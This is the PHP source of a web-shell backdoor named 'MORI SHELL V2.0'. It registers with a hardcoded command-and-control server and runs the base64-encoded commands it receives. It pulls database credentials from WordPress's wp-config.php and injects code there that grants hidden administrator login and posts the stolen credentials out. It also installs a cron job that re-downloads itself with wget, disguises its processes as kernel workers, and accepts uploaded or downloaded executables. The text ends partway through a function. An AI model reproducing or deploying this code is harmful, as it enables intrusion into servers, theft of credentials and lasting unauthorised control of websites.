<?php
/**
 * MORI SHELL V2.0 - LINUX CLIENT
 * WordPress-aware | Process masking | C2 integrated
 */
ob_start();
// Global CORS — allow C2 server and browser stress panel to reach every endpoint
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

ini_set('display_errors', 0);
ini_set('log_errors', 1);
error_reporting(E_ALL);
set_time_limit(0);
ignore_user_abort(true);

// LINUX ONLY - No Windows
if ((!defined('PHP_OS_FAMILY') || PHP_OS_FAMILY !== 'Linux') && 
    stripos(PHP_OS, 'Linux') === false && stripos(PHP_OS, 'Unix') === false) {
    if (php_sapi_name() !== 'cli') exit;
}

define('SHELL_FILE', basename(__FILE__));
define('SHELL_PATH', __DIR__ . '/' . SHELL_FILE);
define('SHELL_VERSION', '2.0-linux');

// OS Detection
$is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') || !empty(getenv('WINDIR'));

$C2_SERVER = "https://juiceshop.cc/nebakiyonla_hurmsaqw/c2serverr.php";
$DEBUG_MODE = true;

// =====================================================
// ERROR LOGGING HELPER
// =====================================================
function log_error_to_file($message) {
    $log_file = __DIR__ . '/hatalar.txt';
    $timestamp = date('Y-m-d H:i:s');
    $log_entry = "[$timestamp] [SHELL] $message\n";
    @file_put_contents($log_file, $log_entry, FILE_APPEND);
}

// Register error handler
set_error_handler(function($errno, $errstr, $errfile, $errline) {
    if ($errno & error_reporting()) {
        log_error_to_file("PHP ERROR [$errno]: $errstr in $errfile:$errline");
    }
    return false;
});

// Register exception handler
set_exception_handler(function($e) {
    log_error_to_file("EXCEPTION: " . $e->getMessage() . " in " . $e->getFile() . ":" . $e->getLine());
});

// =====================================================
// INLINE WORDPRESS DETECTION & PERSISTENCE
// =====================================================

function is_wordpress_installed() {
    $markers = ['/wp-content/', '/wp-includes/', '/wp-admin/', '/wp-config.php'];
    foreach ($markers as $m) {
        if (@file_exists(__DIR__ . $m)) return true;
    }
    return false;
}

function get_wordpress_config() {
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    foreach ($search_dirs as $dir) {
        $cfg = $dir . '/wp-config.php';
        if (@file_exists($cfg)) {
            $content = @file_get_contents($cfg);
            if (!$content) continue;
            $creds = [];
            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['name'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['user'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['pass'] = $m[1];
            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['host'] = $m[1];
            preg_match("/\\\$table_prefix\s*=\s*['\"]([^'\"]+)['\"]/", $content, $m) && $creds['prefix'] = $m[1];
            return !empty($creds) ? $creds : null;
        }
    }
    return null;
}

function inject_wordpress_persistence($shell_url, $c2_server) {
    $wp_config = null;
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    
    foreach ($search_dirs as $dir) {
        if (@file_exists($dir . '/wp-config.php')) {
            $wp_config = $dir . '/wp-config.php';
            break;
        }
    }
    
    if (!$wp_config) return false;
    
    $content = @file_get_contents($wp_config);
    if (!$content || strpos($content, 'mori_backdoor_wp') !== false) return false;
    
    // Extract DB credentials from wp-config
    $db_name = $db_user = $db_pass = $db_host = '';
    preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_name = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_user = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_pass = $m[1];
    preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"]([^'\"]+)['\"]/", $content, $m) && $db_host = $m[1];
    
    // Get dynamic WordPress login credentials
    $wp_creds = generate_wp_login_credentials();
    $blogs_id = $wp_creds['blogs_id'];
    $hash = $wp_creds['hash'];
    
    $creds_json = json_encode(['db_name' => $db_name, 'db_user' => $db_user, 'db_pass' => $db_pass, 'db_host' => $db_host, 'shell_url' => $shell_url], JSON_UNESCAPED_SLASHES);
    $creds_encoded = str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($creds_json));
    
    $inject = "\n// MORI BACKDOOR (mori_backdoor_wp) - Generated: " . date('Y-m-d H:i:s') . "\n// MORI ID: " . $blogs_id . "\nif (!function_exists('mori_backdoor_wp')) {\n" .
        "    function mori_backdoor_wp() {\n" .
        "        // PARAMETER-BASED HIDDEN LOGIN (blogs_id, wp_login)\n" .
        "        if (isset(\$_GET['blogs_id']) && isset(\$_GET['wp_login'])) {\n" .
        "            \$hash = sha1(md5(\$_GET['blogs_id'] . '1776051848'));\n" .
        "            if (\$hash === '" . $hash . "') {\n" .
        "                \$users = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);\n" .
        "                if (!empty(\$users)) {\n" .
        "                    \$user = \$users[0];\n" .
        "                    wp_set_auth_cookie(\$user->ID, true);\n" .
        "                    wp_redirect(admin_url());\n" .
        "                    exit;\n" .
        "                }\n" .
        "            }\n" .
        "        }\n" .
        "        // CREDS EXFIL on admin login\n" .
        "        if (isset(\$_GET['wp_login'])) {\n" .
        "            \$shell_url = '" . addslashes($shell_url) . "';\n" .
        "            \$creds = '" . addslashes($creds_encoded) . "';\n" .
        "            @wp_remote_post(\$shell_url . '?act=wp_creds', ['body' => ['creds' => \$creds]]);\n" .
        "        }\n" .
        "        // AUTO RESTORE\n" .
        "        if (function_exists('curl_init')) {\n" .
        "            \$ch = curl_init('" . addslashes($shell_url) . "');\n" .
        "            curl_setopt(\$ch, CURLOPT_RETURNTRANSFER, true);\n" .
        "            curl_setopt(\$ch, CURLOPT_SSL_VERIFYPEER, false);\n" .
        "            curl_setopt(\$ch, CURLOPT_TIMEOUT, 2);\n" .
        "            @curl_exec(\$ch);\n" .
        "            curl_close(\$ch);\n" .
        "        }\n" .
        "    }\n" .
        "    add_action('wp_footer', 'mori_backdoor_wp', -999);\n" .
        "    add_action('wp_authenticate', 'mori_backdoor_wp', -999);\n" .
        "}\n";
    
    $insertion = "/* That's all, stop editing!";
    if (strpos($content, $insertion) !== false) {
        $new_content = str_replace($insertion, $inject . $insertion, $content);
    } else {
        // Fallback: marker absent (custom WP or non-standard install)
        // Fallback: append before closing PHP tag or at EOF
        $trimmed = rtrim($content);
        if (substr($trimmed, -2) === '?>') {
            $new_content = substr($trimmed, 0, -2) . "\n" . $inject . "\n?>";
        } else {
            $new_content = $trimmed . "\n" . $inject;
        }
    }
    @file_put_contents($wp_config, $new_content);
    return ['blogs_id' => $blogs_id, 'hash' => $hash];
}

// =====================================================
// INLINE PROCESS MASKING (LINUX)
// =====================================================

class ProcessMasker {
    public static function mask() {
        if (php_sapi_name() === 'cli') {
            @putenv('PATH=');
            @putenv('SHELL=');
            @shell_exec("exec -a '[system]' /bin/sh -c 'sleep 999999' &");
            @shell_exec("exec -a '[kworker]' /bin/sh &");
        }
    }
}

ProcessMasker::mask();

function detect_web_shell_url() {
    $https = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || 
             (isset($_SERVER['SERVER_PORT']) && $_SERVER['SERVER_PORT'] == 443);
    $protocol = $https ? 'https://' : 'http://';
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $script = $_SERVER['SCRIPT_NAME'] ?? '/';
    return $protocol . $host . $script;
}

$WEB_URL = detect_web_shell_url();
$web_shell_url = $WEB_URL;  // Alias for c2_register()

// =====================================================
// PERSISTENCE INSTALLATION
// =====================================================

function install_cron_persistence() {
    $shell = SHELL_PATH;
    $url = $GLOBALS['WEB_URL'];
    $script = "*/5 * * * * php '$shell' >/dev/null 2>&1; wget -q '$url' -O '$shell' >/dev/null 2>&1";
    
    // Method 1: shell_exec (preferred)
    if (function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        @shell_exec("(crontab -l 2>/dev/null | grep -v mori; echo '$script') | crontab - 2>/dev/null");
        return true;
    }
    
    // Method 2: proc_open fallback
    if (function_exists('proc_open')) {
        $cron_entry = $script . "\n";
        $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
        $proc = @proc_open('crontab -', $descriptors, $pipes);
        if (is_resource($proc)) {
            fwrite($pipes[0], $cron_entry);
            fclose($pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($proc);
            return true;
        }
    }
    
    // Method 3: Direct /etc/cron.d/ write
    $cron_d = '/etc/cron.d/mori-shell';
    if (@is_writable('/etc/cron.d/')) {
        @file_put_contents($cron_d, $script . "\n", FILE_APPEND);
        @chmod($cron_d, 0644);
        return true;
    }
    
    return false;
}

function install_wp_persistence() {
    if (!is_wordpress_installed()) return;
    $url = $GLOBALS['WEB_URL'];
    @inject_wordpress_persistence($url, $GLOBALS['C2_SERVER']);
}

@install_wp_persistence();
@install_cron_persistence();

// =====================================================
// CLIENT ID & SYSTEM INFO
// =====================================================

function generate_client_id() {
    $id_file = __DIR__ . '/.mori_id';
    if (@file_exists($id_file) && filesize($id_file) > 5) {
        return trim(file_get_contents($id_file));
    }
    $id = 'mori_' . substr(md5(php_uname() . __FILE__ . time()), 0, 16);
    @file_put_contents($id_file, $id);
    return $id;
}

function generate_wp_login_credentials() {
    $creds_file = __DIR__ . '/.wp_login_creds';
    $secret = '1776051848';

    // 1. Try cached creds file
    if (@file_exists($creds_file) && @filesize($creds_file) > 10) {
        $creds = @json_decode(@file_get_contents($creds_file), true);
        if (!empty($creds['blogs_id']) && !empty($creds['hash'])) {
            return $creds;
        }
    }

    // 2. .wp_login_creds missing/corrupt — try to recover blogs_id from wp-config.php
    $search_dirs = [__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))];
    foreach ($search_dirs as $dir) {
        $cfg = $dir . '/wp-config.php';
        if (!@file_exists($cfg)) continue;
        $cfg_content = @file_get_contents($cfg);
        if (!$cfg_content) continue;
        // Look for embedded ID comment: // MORI ID: <blogs_id>
        if (preg_match('/\/\/ MORI ID: ([a-f0-9]{16})/', $cfg_content, $m)) {
            $blogs_id = $m[1];
            $hash = sha1(md5($blogs_id . $secret));
            $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
            @file_put_contents($creds_file, json_encode($creds));
            return $creds;
        }
    }

    // 3. No existing record anywhere — generate fresh
    $blogs_id = substr(bin2hex(random_bytes(16)), 0, 16);
    $hash = sha1(md5($blogs_id . $secret));
    $creds = ['blogs_id' => $blogs_id, 'hash' => $hash, 'timestamp' => time()];
    @file_put_contents($creds_file, json_encode($creds));
    return $creds;
}

$CLIENT_ID = generate_client_id();
$GLOBALS['C2_SHELL'] = __FILE__;

function get_system_info() {
    return [
        'id' => $GLOBALS['CLIENT_ID'],
        'version' => SHELL_VERSION,
        'url' => $GLOBALS['WEB_URL'],
        'php' => phpversion(),
        'os' => php_uname(),
        'user' => get_current_user(),
        'wp' => is_wordpress_installed() ? 'yes' : 'no',
        'wp_root' => is_wordpress_installed() ? (get_wordpress_config() ? 'found' : 'unknown') : null,
        'timestamp' => time(),
    ];
}

// =====================================================
// HTTP COMMUNICATION (3 methods fallback)
// =====================================================

function http_request($method, $url, $data = null) {
    // Method 1: cURL (BEST for POST with raw data)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        
        if ($method === 'POST' && $data) {
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
        }
        
        $result = @curl_exec($ch);
        $error = curl_error($ch);
        @curl_close($ch);
        
        if ($error) {
            error_log("[http_request] cURL error: $error");
        } elseif ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 2: file_get_contents
    if (ini_get('allow_url_fopen')) {
        $opts = [
            'http' => [
                'method' => $method,
                'timeout' => 15,
                'ignore_errors' => true,
            ],
            'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
        ];
        if ($method === 'POST' && $data) {
            $opts['http']['content'] = $data;
            $opts['http']['header'] = 'Content-Type: application/x-www-form-urlencoded';
        }
        $result = @file_get_contents($url, false, stream_context_create($opts));
        if ($result !== false && !empty($result)) {
            return $result;
        }
    }
    
    // Method 3: fsockopen
    $parts = parse_url($url);
    if (!isset($parts['host'])) return null;
    
    $host = $parts['host'];
    $port = ($parts['scheme'] === 'https') ? 443 : 80;
    $path = ($parts['path'] ?? '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');
    
    $fp = @fsockopen(($port === 443 ? 'ssl://' : '') . $host, $port, $errno, $errstr, 10);
    if ($fp) {
        $out = "$method $path HTTP/1.1\r\nHost: $host\r\nConnection: close\r\n";
        if ($method === 'POST' && $data) {
            $out .= "Content-Type: application/x-www-form-urlencoded\r\n";
            $out .= "Content-Length: " . strlen($data) . "\r\n\r\n" . $data;
        } else {
            $out .= "\r\n";
        }
        fwrite($fp, $out);
        $raw = '';
        while (!feof($fp)) $raw .= fgets($fp, 4096);
        fclose($fp);

        // Strip HTTP headers — return body only
        if (!empty($raw)) {
            $sep = strpos($raw, "\r\n\r\n");
            $result = ($sep !== false) ? substr($raw, $sep + 4) : $raw;
            if (!empty($result)) return $result;
        }
    }
    
    // All methods failed - return null
    return null;
}

// =====================================================
// DETECT PYTHON COMMAND
// =====================================================

function detect_python_command() {
    // Python binary detection for Linux systems
    $paths = ['/usr/bin/python3', '/usr/bin/python', '/usr/local/bin/python3', '/usr/local/bin/python'];
    foreach ($paths as $path) {
        if (@file_exists($path) && @is_executable($path)) {
            return $path;
        }
    }
    // Try which command
    if (function_exists('shell_exec')) {
        $python = @shell_exec('which python3 2>/dev/null || which python 2>/dev/null');
        if ($python) return trim($python);
    }
    return null;
}

// =====================================================
// C2 REGISTRATION & COMMAND EXECUTION
// =====================================================

// =====================================================
// COMMAND EXECUTION ENGINE - REMOVED
// Use execute_command() or execute_system_command() instead
// =====================================================

// =====================================================
// API ENDPOINTS
// =====================================================

// Auto-register on first access
// Auto-register (non-blocking, background task)
// Cache registration in memory to avoid repeat registration loops
if (!isset($GLOBALS['_SHELL_REGISTERED'])) {
    $GLOBALS['_SHELL_REGISTERED'] = false;
    
    // Try to read registration status from file (one-time read)
    $reg_file = __DIR__ . '/.registered';
    if (@file_exists($reg_file) && @filesize($reg_file) > 0) {
        $GLOBALS['_SHELL_REGISTERED'] = true;
    } else {
        // First-time registration - non-blocking attempt
        // Try registration with super short timeout (1 sec max)
        @c2_register_background($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        
        // Mark as registered to avoid infinite loop
        $GLOBALS['_SHELL_REGISTERED'] = true;
    }
}

// Handle API requests
if (isset($_GET['m']) || isset($_POST['m'])) {
    // Decode with safe_base64_decode (uses -, _ instead of +, /)
    $encoded = $_GET['m'] ?? $_POST['m'] ?? '';
    $cmd = safe_base64_decode($encoded);
    
    if (!$cmd) {
        echo "[ERROR] Failed to decode command";
        exit;
    }
    
    error_log("[EXEC] Executing command: " . (strlen($cmd ?? '') > 0 ? substr($cmd, 0, 100) : '(empty)'));
    
    $output = execute_command($cmd);
    $task_id = $_GET['task_id'] ?? $_POST['task_id'] ?? null;
    
    error_log("[EXEC] Output length: " . strlen($output));
    
    // Send result to C2
    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $output, $task_id);
    
    // Return output to requester
    echo $output;
    exit;
}

if (isset($_GET['info'])) {
    echo json_encode(get_system_info());
    exit;
}

// =====================================================
// FILE UPLOAD HANDLER (HTTP-based fallback)
// =====================================================
// When shell commands are disabled, C2 sends files via HTTP POST
// Receives: Base64-encoded file content + filename
// Stores: Decoded file to filesystem
if (isset($_POST['act']) && $_POST['act'] == 'upload_file') {
    header('Content-Type: application/json; charset=utf-8');
    
    $encoded_data = $_POST['data'] ?? '';
    $filename = $_POST['filename'] ?? '';
    
    // Validate
    if (empty($encoded_data) || empty($filename)) {
        http_response_code(400);
        echo json_encode(['error' => 'Missing data or filename', 'success' => false]);
        exit;
    }
    
    // Sanitize filename (prevent directory traversal)
    $filename = basename($filename);
    if (strpos($filename, '..') !== false || strpos($filename, '/') !== false) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid filename', 'success' => false]);
        exit;
    }
    
    // Base64 decode
    $file_content = @base64_decode($encoded_data, true);
    if ($file_content === false) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid base64 encoding', 'success' => false]);
        exit;
    }
    
    // Write file to current directory or temp
    $target_dir = sys_get_temp_dir();
    $target_path = $target_dir . '/' . $filename;
    
    // Try current dir first
    if (@is_writable(getcwd())) {
        $target_path = getcwd() . '/' . $filename;
    }
    
    // Write file
    $bytes_written = @file_put_contents($target_path, $file_content);
    if ($bytes_written === false) {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to write file', 'success' => false]);
        exit;
    }
    
    // Make executable if .sh or .py
    @chmod($target_path, 0755);
    
    http_response_code(201);
    echo json_encode([
        'success' => true,
        'filename' => $filename,
        'path' => $target_path,
        'size' => strlen($file_content),
        'message' => 'File uploaded successfully'
    ]);
    exit;
}

// REGISTER DATA ENDPOINT - C2 server pulls system info from here
if (isset($_GET['act']) && $_GET['act'] === 'register_data') {
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode(collect_system_info());
    exit;
}

// PERSISTENCE STATUS ENDPOINT - Report persistence layer status
if (isset($_GET['act']) && $_GET['act'] === 'persistence_status') {
    header('Content-Type: application/json; charset=utf-8');
    
    $persistence_info = [
        'backup_locations' => [],
        'cron_job' => false,
        'wordpress_hooks' => false,
        'daemon_processes' => [],
        'checked_at' => date('c')
    ];
    
    // Backup locations - check common persistence paths
    $backup_paths = [
        '/tmp',
        '/var/tmp',
        '/dev/shm',
        '/home',
        '/root',
        sys_get_temp_dir()
    ];
    
    foreach ($backup_paths as $path) {
        if (@is_dir($path) && @is_writable($path)) {
            // Look for shell backups in this directory
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            $pattern = $path . '/*' . $shell_name;
            $matches = @glob($pattern, GLOB_NOSORT);
            if ($matches && count($matches) > 0) {
                foreach ($matches as $match) {
                    if (@file_exists($match)) {
                        $persistence_info['backup_locations'][] = $match;
                    }
                }
            }
        }
    }
    
    // Check for cron job
    if (function_exists('shell_exec')) {
        $crontab = @shell_exec('crontab -l 2>/dev/null');
        if ($crontab && (strpos($crontab, $GLOBALS['CLIENT_ID'] ?? 'mori') !== false || 
                         strpos($crontab, basename($GLOBALS['C2_SHELL'] ?? __FILE__)) !== false)) {
            $persistence_info['cron_job'] = true;
        }
    }
    
    // Check for WordPress hooks (wp_options table modifications)
    if (defined('ABSPATH') && defined('DB_NAME')) {
        // WordPress environment detected
        $persistence_info['wordpress_hooks'] = true;
    }
    
    // Check for daemon processes
    if (function_exists('shell_exec')) {
        $ps = @shell_exec('ps aux 2>/dev/null');
        if ($ps) {
            $client_id = $GLOBALS['CLIENT_ID'] ?? 'mori';
            $shell_name = basename($GLOBALS['C2_SHELL'] ?? __FILE__);
            foreach (explode("\n", $ps) as $line) {
                if ((strpos($line, $client_id) !== false || strpos($line, $shell_name) !== false) && 
                    strpos($line, 'grep') === false) {
                    // Extract PID
                    $parts = preg_split('/\s+/', trim($line));
                    if (isset($parts[1])) {
                        $persistence_info['daemon_processes'][] = (int)$parts[1];
                    }
                }
            }
            // Remove duplicates
            $persistence_info['daemon_processes'] = array_unique($persistence_info['daemon_processes']);
        }
    }
    
    echo json_encode($persistence_info, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    exit;
}
if (isset($_GET['task'])) {
    echo @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']) ?: "[WAIT]";
    exit;
}

// CLI Daemon mode — cron veya direkt çalışma
if (php_sapi_name() === 'cli') {
    @ProcessMasker::mask();

    // Queue dosyasını işle (web PHP'de exec kısıtlıysa CLI burada çalışır)
    $queue_file = __DIR__ . '/.mori_exec_queue';
    if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
        $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
        @file_put_contents($queue_file, '[]', LOCK_EX); // Temizle
        foreach ($queue as $item) {
            $qcmd = $item['cmd'] ?? '';
            if (!empty($qcmd)) {
                $qout = execute_system_command($qcmd);
                @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE_EXEC] " . $qout, null);
            }
        }
    }

    while (true) {
        $task_raw = @c2_get_task($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID']);
        if ($task_raw && $task_raw !== '[WAIT]' && $task_raw !== '[NO_ID]' && $task_raw !== 'no_task') {
            $task_decoded = @json_decode($task_raw, true);
            if (is_array($task_decoded) && isset($task_decoded['command'])) {
                $cmd     = $task_decoded['command'];
                $task_id = $task_decoded['id'] ?? null;
            } else {
                $cmd     = $task_raw;
                $task_id = null;
            }
            $out = execute_command($cmd);
            @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $cmd, $out, $task_id);
        }

        // Queue'yu da işle her döngüde
        if (@file_exists($queue_file) && @filesize($queue_file) > 2) {
            $queue = @json_decode(@file_get_contents($queue_file), true) ?: [];
            @file_put_contents($queue_file, '[]', LOCK_EX);
            foreach ($queue as $item) {
                $qcmd = $item['cmd'] ?? '';
                if (!empty($qcmd)) {
                    $qout = execute_system_command($qcmd);
                    @c2_send_result($GLOBALS['C2_SERVER'], $GLOBALS['CLIENT_ID'], $qcmd, "[QUEUE] " . $qout, null);
                }
            }
        }

        sleep(5);
    }
}

// No output - shell is silent

function http_get($url) {
    return http_request('GET', $url);
}

function http_post($url, $data) {
    return http_request('POST', $url, $data);
}

function fetch_url_content($url, $timeout = 15) {
    $url = trim($url);
    if (empty($url) || !filter_var($url, FILTER_VALIDATE_URL)) {
        return false;
    }

    // YÖNTEM 1: cURL (en güvenilir)
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 3);
        $result = @curl_exec($ch);
        curl_close($ch);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 2: file_get_contents with stream context
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $result = @file_get_contents($url, false, $context);
        if ($result !== false && strlen($result) > 0) {
            return $result;
        }
    }

    // YÖNTEM 3: fopen fallback
    if (ini_get('allow_url_fopen')) {
        $context = stream_context_create([
            'http' => ['method' => 'GET', 'timeout' => $timeout, 'ignore_errors' => true, 'follow_location' => 1, 'max_redirects' => 3],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false]
        ]);
        $fp = @fopen($url, 'rb', false, $context);
        if ($fp) {
            $result = '';
            while (!feof($fp) && strlen($result) < 10485760) { // 10MB max
                $chunk = fread($fp, 8192);
                if ($chunk === false) break;
                $result .= $chunk;
            }
            fclose($fp);
            if ($result !== '' && strlen($result) > 0) {
                return $result;
            }
        }
    }

    return false;
}

function download_remote_file($url, $filename) {
    $content = fetch_url_content($url);
    if ($content === false) {
        return "[ERROR] URL fetch failed: $url";
    }

    // Absolute path → use directly; relative → resolve under __DIR__
    if ($filename !== '' && ($filename[0] === '/' || $filename[0] === '\\')) {
        $target = $filename;
    } else {
        $target = __DIR__ . '/' . ltrim($filename, '/\\');
    }

    $dir = dirname($target);
    if (!is_dir($dir)) {
        @mkdir($dir, 0755, true);
    }

    $written = @file_put_contents($target, $content);
    if ($written === false) {
        return "[ERROR] Cannot write file: $target";
    }

    // Auto-chmod scripts executable
    $ext = strtolower(pathinfo($target, PATHINFO_EXTENSION));
    @chmod($target, in_array($ext, ['py', 'sh', 'pl', 'rb']) ? 0755 : 0644);
    return "OK: downloaded $url to $target ($written bytes)";
}

function get_server_persistence_url() {
    global $C2_SERVER, $persistence_default_url;
    $c2_server = $C2_SERVER;
    $url = $persistence_default_url;

    $urlver_token = md5('mori_c2_secret_2024_persistence');
    $response = @http_get($c2_server . '?urlver&token=' . $urlver_token);
    if ($response) {
        $response = trim($response);
        if (filter_var($response, FILTER_VALIDATE_URL)) {
            return $response;
        }
    }

    $response = @http_get($c2_server . '?act=persistence_get');
    if ($response) {
        $json = json_decode($response, true);
        if (is_array($json) && isset($json['url']) && filter_var($json['url'], FILTER_VALIDATE_URL)) {
            $url = $json['url'];
        }
    }

    return $url;
}

// =====================================================
// VERİ KODLAMA İŞLEMLERİ
// =====================================================
function safe_base64_encode($data) {
    return str_replace(['+', '/', '='], ['-', '_', ''], base64_encode($data));
}

function safe_base64_decode($data) {
    $data = str_replace(['-', '_'], ['+', '/'], $data);
    $padding = 4 - (strlen($data) % 4);
    if ($padding !== 4) {
        $data .= str_repeat('=', $padding);
    }
    return base64_decode($data, true);
}

function safe_json_encode($data) {
    return json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
}

// =====================================================
// GELİŞMİŞ SİSTEM BİLGİ TOPLAMA
// =====================================================
function collect_system_info() {
    global $is_windows;
    
    $info = [
        'os' => [
            'type' => PHP_OS ?? 'unknown',
            'family' => detect_os_family(),
            'hostname' => @gethostname() ?: 'unknown',
            'arch' => @php_uname('m') ?: 'unknown',
            'kernel' => @php_uname('r') ?: 'unknown',
            'full' => @php_uname('a') ?: 'unknown'
        ],
        'web' => [
            'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'unknown',
            'user' => get_current_user(),
            'cwd' => getcwd() ?: __DIR__,
            'document_root' => $_SERVER['DOCUMENT_ROOT'] ?? '',
            'script_path' => __FILE__,
            'web_shell_url' => $GLOBALS['web_shell_url'] ?? 'unknown',
            'server_ip' => $_SERVER['SERVER_ADDR'] ?? $_SERVER['LOCAL_ADDR'] ?? 'unknown',
            'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown'
        ],
        'php' => [
            'version' => PHP_VERSION,
            'sapi' => php_sapi_name(),
            'extensions' => get_loaded_extensions(),
            'disabled_functions' => ini_get('disable_functions'),
            'memory_limit' => ini_get('memory_limit'),
            'max_execution_time' => ini_get('max_execution_time')
        ],
        'disk' => [
            'total' => @disk_total_space(__DIR__),
            'free' => @disk_free_space(__DIR__)
        ],
        'time' => [
            'timestamp' => time(),
            'timezone' => date_default_timezone_get(),
            'datetime' => date('Y-m-d H:i:s')
        ],
        'permissions' => [
            'can_read' => is_readable(__FILE__),
            'can_write' => is_writable(__DIR__),
            'can_execute' => is_executable(__FILE__)
        ]
    ];
    
    // Windows özel bilgiler
    if ($is_windows) {
        $info['windows'] = [
            'comspec' => getenv('COMSPEC'),
            'windir' => getenv('WINDIR'),
            'username' => getenv('USERNAME'),
            'computername' => getenv('COMPUTERNAME')
        ];
    }
    
    return $info;
}

function detect_os_family() {
    $os = strtoupper(PHP_OS);
    if (strpos($os, 'WIN') === 0) return 'WINDOWS';
    if (strpos($os, 'DAR') === 0) return 'MACOS';
    if (strpos($os, 'LINUX') === 0) return 'LINUX';
    if (strpos($os, 'BSD') !== false) return 'BSD';
    return 'UNKNOWN';
}

// =====================================================
// C2 API İŞLEMLERİ (GELİŞMİŞ)
// =====================================================
// C2 REGISTRATION - BACKGROUND & MAIN
// =====================================================

/**
 * Background registration - non-blocking, fail-fast
 * Used for auto-registration on first load
 * Never blocks page load (1 sec timeout max)
 */
function c2_register_background($server, $id) {
    global $web_shell_url;
    
    try {
        $sysinfo = collect_system_info();
    } catch (Exception $e) {
        error_log("[c2_register_background] Sysinfo failed: " . $e->getMessage());
        return false;
    }

    $payload = [
        'id' => $id,
        'web_shell_url' => $web_shell_url,
        'sysinfo' => $sysinfo,
        'timestamp' => time(),
        'version' => '3.0'
    ];

    $encoded = safe_base64_encode(safe_json_encode($payload));
    
    // ONE attempt only - fail-fast (1 second timeout)
    $result = @http_post_timeout($server . '?act=reg', $encoded, 1);
    
    $trimmed = trim($result ?? '');
    $reg_json = $trimmed ? @json_decode($trimmed, true) : null;
    $reg_ok = ($trimmed === 'ok') || (!empty($reg_json['success']));
    if ($result && $reg_ok) {
        error_log("[c2_register_background] SUCCESS");
        @file_put_contents(__DIR__ . '/.registered', time());
        return true;
    }

